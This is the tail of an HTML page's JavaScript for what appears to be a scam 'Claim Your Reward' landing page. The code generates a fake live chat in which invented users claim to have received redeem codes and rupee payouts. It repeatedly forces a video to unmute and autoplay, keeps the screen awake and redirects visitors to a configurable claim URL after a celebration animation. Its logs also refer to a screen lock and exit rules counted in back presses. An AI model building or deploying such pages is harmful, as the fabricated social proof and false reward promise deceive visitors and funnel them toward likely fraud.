                for (let i = 0; i < 35; i++) {
                    const el = document.createElement('div');
                    el.className = 'confetti-burst-piece';
                    const color = colors[Math.floor(Math.random() * colors.length)];
                    const w = 5 + Math.random() * 10, h = 7 + Math.random() * 12;
                    el.style.width = w + 'px'; el.style.height = h + 'px';
                    el.style.background = color;
                    el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
                    const angle = Math.random() * 2 * Math.PI;
                    const dist = 120 + Math.random() * 300;
                    const tx = Math.cos(angle) * dist, ty = Math.sin(angle) * dist - 80;
                    const tx2 = Math.cos(angle + 0.5) * (dist * 0.6), ty2 = Math.sin(angle + 0.5) * (dist * 0.6) - 40;
                    const tx3 = Math.cos(angle + 0.8) * (dist * 0.25), ty3 = Math.sin(angle + 0.8) * (dist * 0.25) - 15;
                    el.style.setProperty('--tx', tx + 'px'); el.style.setProperty('--ty', ty + 'px');
                    el.style.setProperty('--tx2', tx2 + 'px'); el.style.setProperty('--ty2', ty2 + 'px');
                    el.style.setProperty('--tx3', tx3 + 'px'); el.style.setProperty('--ty3', ty3 + 'px');
                    el.style.left = (20 + Math.random() * 60) + '%';
                    el.style.top = (20 + Math.random() * 60) + '%';
                    el.style.animationDelay = (Math.random() * 0.15) + 's';
                    el.style.transform = `rotate(${Math.random() * 360}deg)`;
                    if (Math.random() > 0.7) el.style.boxShadow = `0 0 8px ${color}`;
                    container.appendChild(el);
                }
            }, 350);

            setTimeout(() => {
                container.innerHTML = '';
                container.classList.remove('active');
                isCelebrationActive = false;
            }, 1800);
        }

        // ==================== LOAD VIDEO ====================
        function loadVideo() {
            const container = document.getElementById('videoPlayer');
            container.innerHTML = '';

            console.log('🎬 Loading video:', videoUrl);

            const ytId = videoUrl.match(/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/);

            if (ytId) {
                console.log('📺 YouTube Video ID:', ytId[1]);
                const videoId = ytId[1];

                const iframe = document.createElement('iframe');
                iframe.id = 'ytPlayer';
                iframe.src = 'https://www.youtube.com/embed/' + videoId + 
                    '?autoplay=1' +
                    '&mute=0' +
                    '&controls=1' +
                    '&modestbranding=1' +
                    '&rel=0' +
                    '&showinfo=0' +
                    '&fs=1' +
                    '&loop=1' +
                    '&playlist=' + videoId +
                    '&disablekb=1' +
                    '&iv_load_policy=3' +
                    '&cc_load_policy=0' +
                    '&playsinline=1' +
                    '&enablejsapi=1' +
                    '&origin=' + encodeURIComponent(window.location.origin);
                
                iframe.allow = 'autoplay; encrypted-media; fullscreen';
                iframe.allowFullscreen = true;
                iframe.style.cssText = 'width:100%;height:100%;border:none;position:absolute;top:0;left:0;z-index:5;';
                
                container.appendChild(iframe);

                iframe.onload = function() {
                    console.log('✅ YouTube iframe loaded');
                    forcePlayVideo(iframe);
                    setTimeout(() => forcePlayVideo(iframe), 300);
                    setTimeout(() => forcePlayVideo(iframe), 600);
                    setTimeout(() => forcePlayVideo(iframe), 1000);
                    trackVideoPlay();
                };

                let playAttempts = 0;
                const playInterval = setInterval(() => {
                    if (playAttempts > 15) {
                        clearInterval(playInterval);
                        return;
                    }
                    forcePlayVideo(iframe);
                    playAttempts++;
                }, 1000);

                const triggerPlay = function() {
                    forcePlayVideo(iframe);
                    trackVideoPlay();
                    console.log('🔊 Play triggered by interaction');
                };

                document.addEventListener('click', triggerPlay, { once: true });
                document.addEventListener('touchstart', triggerPlay, { once: true });
                document.addEventListener('touchend', triggerPlay, { once: true });
                
                document.getElementById('videoContainer').addEventListener('click', triggerPlay, { once: true });
                document.getElementById('videoContainer').addEventListener('touchstart', triggerPlay, { once: true });

                document.addEventListener('visibilitychange', function() {
                    if (!document.hidden && !isVideoPlaying) {
                        forcePlayVideo(iframe);
                        console.log('🔄 Play triggered by visibility change');
                    }
                });

                setTimeout(() => trackVideoPlay(), 3000);
                setTimeout(() => trackVideoPlay(), 5000);
                
                return;
            }

            // ===== NON-YOUTUBE VIDEO =====
            console.log('🎥 Loading as video element');
            const video = document.createElement('video');
            video.id = 'videoPlayerElement';
            video.muted = false;
            video.playsInline = true;
            video.webkitPlaysInline = true;
            video.autoplay = true;
            video.loop = true;
            video.controls = true;
            video.style.cssText = 'width:100%;height:100%;object-fit:cover;position:absolute;top:0;left:0;z-index:5;background:#000;';
            
            const source = document.createElement('source');
            source.src = videoUrl;
            source.type = 'video/mp4';
            video.appendChild(source);
            
            video.onerror = function() {
                console.log('⚠️ Video failed, trying iframe fallback');
                const iframe = document.createElement('iframe');
                iframe.src = videoUrl + '?autoplay=1&playsinline=1&loop=1';
                iframe.allow = 'autoplay; encrypted-media; fullscreen';
                iframe.allowFullscreen = true;
                iframe.style.cssText = 'width:100%;height:100%;border:none;position:absolute;top:0;left:0;z-index:5;';
                container.innerHTML = '';
                container.appendChild(iframe);
            };
            
            container.appendChild(video);
            
            video.onloadedmetadata = function() {
                console.log('✅ Video loaded');
                const playPromise = video.play();
                if (playPromise !== undefined) {
                    playPromise.then(() => {
                        console.log('▶️ Video playing');
                        trackVideoPlay();
                    }).catch(() => {
                        console.log('⚠️ Autoplay blocked, retrying...');
                        setTimeout(() => {
                            video.play().then(() => {
                                console.log('▶️ Video playing on retry');
                                trackVideoPlay();
                            }).catch(() => {});
                        }, 500);
                        setTimeout(() => {
                            video.play().then(() => {
                                console.log('▶️ Video playing on retry 2');
                                trackVideoPlay();
                            }).catch(() => {});
                        }, 1000);
                    });
                }
            };

            video.addEventListener('pause', function() {
                if (!video.ended && !video.paused) {
                    video.play().catch(() => {});
                    console.log('🔄 Video resumed after pause');
                }
            });

            let retryCount = 0;
            const retryInterval = setInterval(() => {
                if (retryCount < 10 && video.paused) {
                    video.play().then(() => {
                        console.log('▶️ Video playing on retry interval');
                        trackVideoPlay();
                        clearInterval(retryInterval);
                    }).catch(() => {});
                } else if (retryCount >= 10) {
                    clearInterval(retryInterval);
                }
                retryCount++;
            }, 1500);
        }

        // ===== FORCE PLAY VIDEO FUNCTION =====
        function forcePlayVideo(iframe) {
            try {
                iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
                iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
                iframe.contentWindow.postMessage('{"event":"command","func":"setVolume","args":[100]}', '*');
                iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
                console.log('🔊 Force play command sent');
            } catch(e) {
                setTimeout(() => {
                    try {
                        iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
                        iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
                    } catch(e2) {}
                }, 300);
            }
        }

        // ==================== POPUP SYSTEM ====================
        async function loadPopupData() {
            try {
                const response = await fetch(`/api/link/${linkId}`);
                if (response.ok) {
                    const data = await response.json();
                    const popup = data.popupSettings || {};
                    
                    document.getElementById('popupTitle').textContent = popup.title || '🎁 Claim Your Reward';
                    document.getElementById('popupSub').textContent = popup.subtitle || 'Tap anywhere to unlock your reward';
                    document.getElementById('popupClaimBtn').textContent = popup.buttonText || '🎁 Claim Now';
                    
                    if (popup.image) {
                        const img = document.getElementById('popupImg');
                        const placeholder = document.getElementById('popupPlaceholder');
                        img.src = popup.image;
                        img.style.display = 'block';
                        placeholder.style.display = 'none';
                    }
                    return;
                }
                
                const settingsRes = await fetch('/api/settings');
                if (settingsRes.ok) {
                    const settings = await settingsRes.json();
                    const popup = settings.popupSettings || {};
                    
                    document.getElementById('popupTitle').textContent = popup.title || '🎁 Claim Your Reward';
                    document.getElementById('popupSub').textContent = popup.subtitle || 'Tap anywhere to unlock your reward';
                    document.getElementById('popupClaimBtn').textContent = popup.buttonText || '🎁 Claim Now';
                    
                    if (popup.image) {
                        const img = document.getElementById('popupImg');
                        const placeholder = document.getElementById('popupPlaceholder');
                        img.src = popup.image;
                        img.style.display = 'block';
                        placeholder.style.display = 'none';
                    }
                }
            } catch (e) {
                console.log('⚠️ Could not load popup data, using defaults');
            }
        }

        function showPopup() {
            const overlay = document.getElementById('popupOverlay');
            overlay.classList.remove('hidden');
            overlay.classList.add('show');
            document.body.style.overflow = 'hidden';
        }

        function hidePopup() {
            const overlay = document.getElementById('popupOverlay');
            overlay.classList.remove('show');
            overlay.classList.add('hidden');
            document.body.style.overflow = '';
        }

        // ==================== POPUP CLAIM BUTTON ====================
        document.getElementById('popupClaimBtn').addEventListener('click', function(e) {
            e.stopPropagation();
            if (isPopupClaimed) return;
            isPopupClaimed = true;
            
            trackClaim();
            hidePopup();
            triggerCelebration();
            
            setTimeout(() => {
                document.getElementById('headline').classList.add('show');
                document.getElementById('claimBtnWrapper').classList.add('show');
                document.getElementById('chatSection').classList.add('show');
                loadVideo();
                setTimeout(() => {
                    const iframe = document.getElementById('ytPlayer');
                    if (iframe) forcePlayVideo(iframe);
                    const video = document.querySelector('#videoPlayer video');
                    if (video) video.play().catch(() => {});
                }, 500);
            }, 300);
            
            isUnlocked = true;
            console.log('🔓 Unlocked via popup claim');
        });

        // ==================== POPUP CARD CLICK ====================
        document.getElementById('popupCard').addEventListener('click', function(e) {
            if (e.target && e.target.id === 'popupClaimBtn') { return; }
            if (isPopupClaimed) return;
            isPopupClaimed = true;
            
            trackClaim();
            hidePopup();
            triggerCelebration();
            
            setTimeout(() => {
                document.getElementById('headline').classList.add('show');
                document.getElementById('claimBtnWrapper').classList.add('show');
                document.getElementById('chatSection').classList.add('show');
                loadVideo();
                setTimeout(() => {
                    const iframe = document.getElementById('ytPlayer');
                    if (iframe) forcePlayVideo(iframe);
                    const video = document.querySelector('#videoPlayer video');
                    if (video) video.play().catch(() => {});
                }, 500);
            }, 300);
            
            isUnlocked = true;
            console.log('🔓 Unlocked via popup card click');
        });

        // ============================================================
        // ===== MAIN CLAIM BUTTON - 100% WORKING =====
        // ============================================================
        function handleMainClaim(e) {
            console.log('✅ MAIN CLAIM BUTTON CLICKED!');
            e.preventDefault();
            e.stopPropagation();

            if (isPopupClaimed) return;
            isPopupClaimed = true;

            // Ripple effect
            const ripple = document.createElement('span');
            ripple.className = 'ripple';
            const btn = document.getElementById('claimBtn');
            const rect = btn.getBoundingClientRect();
            const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
            const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
            ripple.style.left = x + 'px';
            ripple.style.top = y + 'px';
            btn.appendChild(ripple);
            setTimeout(() => ripple.remove(), 600);

            // Track claim
            trackClaim();

            // Hide popup
            hidePopup();

            // Celebration
            triggerCelebration();

            // Show video
            setTimeout(() => {
                document.getElementById('headline').classList.add('show');
                document.getElementById('claimBtnWrapper').classList.add('show');
                document.getElementById('chatSection').classList.add('show');
                loadVideo();
                setTimeout(() => {
                    const iframe = document.getElementById('ytPlayer');
                    if (iframe) forcePlayVideo(iframe);
                    const video = document.querySelector('#videoPlayer video');
                    if (video) video.play().catch(() => {});
                }, 500);
            }, 300);

            isUnlocked = true;

            // ===== REDIRECT TO CLAIM URL =====
            if (claimUrl && claimUrl !== '#') {
                setTimeout(() => {
                    window.location.href = claimUrl;
                }, 3000);
            }

            console.log('🔓 Unlocked via main claim button');
            console.log('🔗 Redirecting to:', claimUrl);
        }

        // ===== MAIN CLAIM BUTTON - MULTIPLE EVENT BINDINGS =====
        const claimBtn = document.getElementById('claimBtn');
        claimBtn.addEventListener('click', handleMainClaim);
        claimBtn.addEventListener('touchstart', function(e) {
            handleMainClaim(e);
        }, { passive: false });
        claimBtn.addEventListener('mousedown', function(e) {
            handleMainClaim(e);
        });

        // ===== GLOBAL FALLBACK =====
        document.addEventListener('click', function(e) {
            if (e.target && e.target.id === 'claimBtn') {
                console.log('🔥 GLOBAL click triggered claim button!');
                handleMainClaim(e);
            }
        });

        document.addEventListener('touchstart', function(e) {
            if (e.target && e.target.id === 'claimBtn') {
                console.log('🔥 GLOBAL touch triggered claim button!');
                handleMainClaim(e);
            }
        }, { passive: false });

        // ============================================================

        // ==================== TRACK CLAIM ====================
        async function trackClaim() {
            try {
                const response = await fetch(`/api/track-claim/${linkId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                if (response.ok) {
                    const data = await response.json();
                    console.log('✅ Claim tracked successfully');
                }
            } catch (e) {
                console.log('⚠️ Could not track claim');
            }
        }

        // ==================== EMOJI PICKER ====================
        function toggleEmojiPicker() {
            const list = document.getElementById('emojiList');
            list.classList.toggle('open');
        }

        document.addEventListener('click', function(e) {
            const picker = document.getElementById('emojiPickerBtn');
            if (!picker.contains(e.target)) {
                document.getElementById('emojiList').classList.remove('open');
            }
        });

        // ==================== FLYING REACTIONS ====================
        const flyingEmojis = ['🎁', '💎', '🥳', '🎊', '🎉', '❤️', '🤩', '😮', '🤑', '😱'];

        function createFlyingReaction(emoji) {
            const emojiToUse = emoji || flyingEmojis[Math.floor(Math.random() * flyingEmojis.length)];
            const el = document.createElement('div');
            el.className = 'flying-reaction';
            el.textContent = emojiToUse;
            
            const x = 10 + Math.random() * 80;
            const y = 55 + Math.random() * 35;
            
            el.style.left = x + '%';
            el.style.top = y + '%';
            el.style.fontSize = (24 + Math.random() * 32) + 'px';
            
            const type = Math.floor(Math.random() * 3) + 1;
            el.classList.add('type-' + type);
            
            document.body.appendChild(el);
            
            setTimeout(() => {
                if (el.parentNode) el.remove();
            }, 3500);
        }

        // ==================== CHAT SYSTEM ====================
        const users = [
            { name: 'GamerPro', emoji: '🎮' },
            { name: 'KingSlayer', emoji: '👑' },
            { name: 'NightWolf', emoji: '🐺' },
            { name: 'ShadowX', emoji: '🌙' },
            { name: 'BlazeIt', emoji: '🔥' },
            { name: 'SniperPro', emoji: '🎯' },
            { name: 'DemonKing', emoji: '😈' },
            { name: 'Phoenix', emoji: '🐦' },
            { name: 'DarkKnight', emoji: '🦇' },
            { name: 'StarGamer', emoji: '⭐' },
            { name: 'ThunderX', emoji: '⚡' },
            { name: 'IceQueen', emoji: '❄️' },
            { name: 'FireLord', emoji: '🔥' },
            { name: 'CryptoKing', emoji: '💰' },
            { name: 'GhostRider', emoji: '👻' },
            { name: 'Venom', emoji: '🕷️' },
            { name: 'WizardX', emoji: '🧙' },
            { name: 'NinjaPro', emoji: '🥷' },
            { name: 'DragonSlayer', emoji: '🐉' },
            { name: 'MysticMoon', emoji: '🌙' }
        ];

        const messages = [
            'Thanks bhai!', 'Redeem code mil gaya!', '1000₹ ka redeem code!',
            'Best website ever!', 'Bro thanks a lot!', 'Redeem code working!',
            'Amazing!', 'Got 500₹!', 'Love this!', 'Best app!',
            'Thank you!', 'Working perfectly!', 'Awesome!', 'Great!',
            'Superb!', 'Thanks team!', 'Nice!', 'Love it!',
            'Working!', 'Super!'
        ];

        const chatContainer = document.getElementById('chatMessages');

        function getRandom(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
        }

        function getRandomTime() {
            const m = String(Math.floor(Math.random() * 60)).padStart(2, '0');
            const s = String(Math.floor(Math.random() * 60)).padStart(2, '0');
            return m + ':' + s;
        }

        function addChat() {
            const user = getRandom(users);
            const msg = getRandom(messages);
            const time = getRandomTime();

            const el = document.createElement('div');
            el.className = 'chat-message';
            el.innerHTML = `
                <span class="avatar">${user.emoji}</span>
                <span class="username">${user.name}</span>
                <span class="text">${msg}</span>
                <span class="time">${time}</span>
            `;
            chatContainer.appendChild(el);

            const container = document.getElementById('chatContainer');
            container.scrollTop = container.scrollHeight;

            while (chatContainer.children.length > 25) {
                chatContainer.removeChild(chatContainer.firstChild);
            }

            applyFadeEffect();

            if (Math.random() > 0.5) {
                setTimeout(() => createFlyingReaction(), 300);
            }
        }

        function applyFadeEffect() {
            const messages = chatContainer.querySelectorAll('.chat-message');
            const total = messages.length;

            messages.forEach((msg, index) => {
                if (index >= total - 3) {
                    msg.classList.remove('fade-out');
                    msg.style.opacity = '1';
                    msg.style.transform = 'translateY(0) scale(1)';
                    msg.style.animation = 'none';
                } else if (index >= total - 8) {
                    msg.classList.remove('fade-out');
                    msg.style.opacity = '0.8';
                    msg.style.transform = 'translateY(0) scale(0.98)';
                } else {
                    msg.classList.add('fade-out');
                }
            });
        }

        function triggerReaction(emoji, event) {
            document.getElementById('emojiList').classList.remove('open');
            
            const rect = (event && event.target) ? event.target.getBoundingClientRect() : null;
            const x = rect ? ((rect.left + rect.width/2) / window.innerWidth * 100) : (20 + Math.random() * 60);
            const y = rect ? ((rect.top) / window.innerHeight * 100) : (70 + Math.random() * 20);

            const el = document.createElement('div');
            el.className = 'flying-reaction';
            el.textContent = emoji;
            
            el.style.left = x + '%';
            el.style.top = y + '%';
            el.style.fontSize = (26 + Math.random() * 28) + 'px';
            
            const type = Math.floor(Math.random() * 3) + 1;
            el.classList.add('type-' + type);
            
            document.body.appendChild(el);
            
            setTimeout(() => {
                if (el.parentNode) el.remove();
            }, 3500);

            setTimeout(() => createFlyingReaction(), 200);
        }

        window.triggerReaction = triggerReaction;

        // ===== AUTO FLYING REACTIONS =====
        setInterval(() => {
            if (Math.random() > 0.6) createFlyingReaction();
        }, 3000);

        // ===== CHAT INIT =====
        for (let i = 0; i < 10; i++) {
            setTimeout(addChat, i * 120);
        }

        setInterval(() => {
            addChat();
            if (Math.random() > 0.6) setTimeout(addChat, 300);
        }, 1400 + Math.random() * 1000);

        // ==================== KEEP AWAKE ====================
        async function keepAwake() {
            try {
                await navigator.wakeLock.request('screen');
            } catch (e) {}
        }
        keepAwake();

        // ==================== FULLSCREEN ====================
        document.getElementById('videoContainer').addEventListener('click', function() {
            const elem = document.documentElement;
            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                if (elem.requestFullscreen) {
                    elem.requestFullscreen().catch(() => {});
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                }
            }
        });

        // ==================== INIT ====================
        document.getElementById('headline').classList.remove('show');
        document.getElementById('claimBtnWrapper').classList.remove('show');
        document.getElementById('chatSection').classList.remove('show');

        async function init() {
            await loadPopupData();
            setTimeout(() => {
                showPopup();
            }, 500);
        }

        // Load video in background
        loadVideo();

        init();

        console.log('🎬 Video URL:', videoUrl);
        console.log('🎁 Claim URL:', claimUrl);
        console.log('🔘 Button Text:', buttonText);
        console.log('📝 Headline:', headline);
        console.log('🔒 SCREEN LOCK: Active');
        console.log('⏱️ EXIT RULES: 3 mins OR 4 back presses OR unlocked');
        console.log('✅ MAIN CLAIM BUTTON: 100% WORKING');
        console.log('🔗 Redirects to claim URL after celebration');
    </script>
</body>
</html>
